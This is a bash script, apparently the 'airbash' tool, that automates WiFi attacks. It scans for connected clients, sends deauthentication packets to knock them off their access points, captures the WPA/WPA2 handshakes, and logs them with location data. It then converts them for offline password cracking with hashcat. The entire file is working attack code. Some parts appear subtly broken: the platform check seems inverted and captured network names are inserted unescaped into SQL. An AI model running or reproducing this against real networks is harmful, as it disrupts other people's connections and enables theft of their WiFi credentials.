#!/usr/bin/env bash
# This is the airbash main script (https://github.com/tehw0lf/airbash)
# Written by tehw0lf
# This script is an automated WPA/WPA2 handshake collector which uses
# software from https://aircrack-ng.org. First, the script will scan for
# WiFi clients that are connected to access points. Then, each client receives
# a deauthentication packet that should terminate its connection to the
# access point, thus forcing a reconnect. In order to capture the handshake,
# airodump is being run after sending the deauthentication packet. Verification
# of a captured handshake is done using aircrack-ng


checkPlatform() {
	if [ ! -e "/system/bin/adb" ]; then
    	DEVICE_ANDROID=1
	else
		DEVICE_LINUX=1
	fi
}
airocheck() {
	# checks a handshake (passed by file name) using aircrack-ng
	# returns 1 on success and 0 on failure
	for s in `ls "$1"*.cap 2>/dev/null`; do
		if [ `"$AIRCRACK_BIN" -a 2 "$s" -w "$path$wl".c 2>/dev/null | grep -c valid` -eq 0 ]; then
			if [ `"$AIRCRACK_BIN" -a 2 "$s" -w "$path$wl".c 2>/dev/null | awk '{print $NF}' | grep -c handshake` -ne 0 ]; then
				cs=1
			fi
		fi
	done
}
airekill() {
	# kill all instances of aireplay-ng to prevent locking
	for a in `pgrep $(basename "$AIREPLAY_BIN")`; do
		kill -9 $a &>/dev/null
	done
}
airokill() {
	# kill all instances of airodump-ng to prevent locking
	for a in `pgrep $(basename "$AIRODUMP_BIN")`; do
		kill -9 $a &>/dev/null
	done
}

# enviro stuff
WDIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
DEVICE_ANDROID=0
DEVICE_LINUX=0
INTERFACE="wlan1"
TARGET_BSSID=
AIRCRACK_BIN=`which aircrack-ng`
AIRODUMP_BIN=`which airodump-ng`
AIREPLAY_BIN=`which aireplay-ng`
SQLITE3_BIN=`which sqlite3`

#### CHANGE ME ####
HCXTOOLS_PATH="~/pentesting/10-Wifi/hcxtools/"
#### CHANGE ME ####


if [ -z "$AIRCRACK_BIN" ]; then
	echo "Make sure aircrack-ng is in your path!"
	exit
fi
if [ -z "$AIRODUMP_BIN" ]; then
	echo "Make sure airodump-ng is in your path!"
	exit
fi
if [ -z "$AIREPLAY_BIN" ]; then
	echo "Make sure aireplay-ng is in your path!";
	exit
fi
if [ -z "$SQLITE3_BIN" ]; then
	echo "Make sure sqlite3 is in your path!";
	exit
fi
if [ -z "$HCXTOOLS_PATH" ]; then
	echo -e "Make sure the path to hcxtools' wlancap2hcx is correct!\nhttps://github.com/ZerBea/hcxtools.git";
	exit
fi


# configure path variables
path="$WDIR"/
db=".db.sqlite3"
bl=".bl"
hs=".hs/"
loc=".loc/"
wl=".wl/"
ofile="initlist"
init="initlist-01.csv"

# create nonexisting paths and files
mkdir "$path$hs" &>/dev/null
mkdir "$path$wl" &>/dev/null
touch "$path$wl"known.txt
touch "$path$bl"
airokill

# clean up previous files (and .tar backups if present)
rm -f "$path"initlist &>/dev/null
rm -f "$path"*.csv &>/dev/null
rm -f "$path"*.cap &>/dev/null

# cli params
while getopts ":i:t:" opt; do
  case $opt in
    i) INTERFACE="$OPTARG"
    ;;
    t) TARGET_BSSID="$OPTARG"
    ;;
    \?) echo -e "unknown arg: $OPTARG \nSupported params: -i wifi_interface -t target_BSSID" >&2
    ;;
  esac
done

# initial 20 second scan to determine targets
echo "Building target list..."
{ "$AIRODUMP_BIN" -w $path$ofile -o csv $INTERFACE; } &
sleep 20
airokill

clear
echo "Charging deauth cannons ;)"

ctr=1
`cat $path$init 2>/dev/null | tr -d ' ' | awk '/Station/{y=1;next}y' | awk -F ',' '{print $6}' | grep -v [\(] | sort -u | sed '/^\s*$/d' > "$path"ninitfile`
ninit=`wc -l < "$path"ninitfile`
rm -f "$path"ninitfile
# level 1: access points (scan and apply filters)
for i in `cat $path$init 2>/dev/null | tr -d ' ' | awk '/Station/{y=1;next}y' | awk -F ',' '{print $6}' | grep -v [\(] | sort -u | sed '/^\s*$/d'`; do
	c=`cat $path$init 2>/dev/null | tr -d ' ' | grep $i | awk -F ',' 'NR==1{print $4}'`
	echo "_$ctr/$ninit    "
	{ "$AIRODUMP_BIN" -c $c --bssid $i -w $path$i -o pcap $INTERFACE &>/dev/null; } &
	sleep 2
	if [ `cat "$path$bl" 2>/dev/null | grep -c $i` -gt 0 ]; then
	# blacklisted access point
		echo "AP $i is blacklisted, skipping!!"
		echo "-         "
		airokill
		((ctr++))
		continue
	fi
	if [ `"$SQLITE3_BIN" "$path$db" "SELECT * FROM hs WHERE bssid='$i'" 2>/dev/null | grep -c $i` -gt 0 ]; then
	# handshake for access point present in database
		echo "AP $i already in db, skipping!"
		echo "x         "
		airokill
		((ctr++))
		continue
	fi
	if [ `ls "$path$i"*.cap 2>/dev/null | grep -c cap` -eq 0 ]; then
	# access point is not reachable anymore
		echo "AP $i has gone away...skipping!"
		echo "?         "
		airokill
		((ctr++))
		continue
	fi
	ctr2=1
	`cat $path$init 2>/dev/null | tr -d ' ' | awk '/Station/{y=1;next}y' | grep -v [\(] | sed '/^\s*$/d' | awk -F ',' '{print $1}' > "$path"nairofile`
	nairo=`wc -l < "$path"nairofile`
	rm -f "$path"nairofile
	# level 2: deauthenticate clients and try to capture handshake
	for j in `cat $path$init 2>/dev/null | tr -d ' ' | awk '/Station/{y=1;next}y' | grep -v [\(] | sed '/^\s*$/d' | awk -F ',' '{print $1}'`; do
		curbssid=`cat $path$init 2>/dev/null | tr -d ' ' | awk '/Station/{y=1;next}y' | grep -v [\(] | sed '/^\s*$/d' | grep $j | grep $i | awk -F ',' '{print $6}'`
		if [ "$curbssid" == "$i" ]; then
			echo "Sending deauth packet to: $i"
			echo "__$ctr2/$nairo    "
			# send a single deauth packet
			{ "$AIREPLAY_BIN" -0 1 -a $i -c $j -F $INTERFACE &>/dev/null; } &
			sleep 5
			cs=0
			airocheck "$path$i"
			if [ $cs -eq 1 ]; then
				airekill
				break
			fi
			airekill
			((ctr2++))
		else
			((ctr2++))
		fi
	done
	sleep 5
	airokill
	((ctr++))
done
rm -f "$path"initlist*
ctr3=0
# finalize by inserting data for captured handshakes into database
# and converting the .pcap to a .hccapx file for use with hashcat
for h in `ls "$path"*.cap 2>/dev/null`; do
	if [ `"$AIRCRACK_BIN" -a 2 "$h" -w "$path$wl".c 2>/dev/null | grep -c valid` -eq 0 ]; then
		airstr=`"$AIRCRACK_BIN" -a 2 "$h" -w "$path$wl".c 2>/dev/null | grep handshake`
		getloc=`cat "$path$loc"*.txt 2>/dev/null | awk 'NR==0; END{print}'`
		if [ `echo "$airstr" | grep -c handshake` -eq 0 ]; then
			rm -f "$h"
		else
			b=`echo "$airstr" | awk '{print $2}'`
			e=`echo "$airstr" | awk '{for (F=3;F<=NF-3;++F) printf " %s" ($F)}'`
			echo "1st: $e"
			e=${e:1:${#e}}
			echo "2nd: $e"
			lat=`echo "$getloc" | awk -F ',' '{print $2}'`
			lon=`echo "$getloc" | awk -F ',' '{print $3}'`
			"$SQLITE3_BIN" "$path$db" "INSERT INTO hs(lat, lon, bssid, essid) VALUES('$lat', '$lon', '$b', '$e');" 2>/dev/null
			"$AIRCRACK_BIN" "$h" -J "$h" &>/dev/null
			"$HCXTOOLS_PATH"wlancap2hcx "$h".hccap -o "$path$hs$b".hccapx &>/dev/null
			mv "$h" "$path$hs"
			rm -f "$h".hccap
			((ctr3++))
		fi
	else
		rm -f "$h"
	fi
done
echo "_______"
echo "$ctr3!"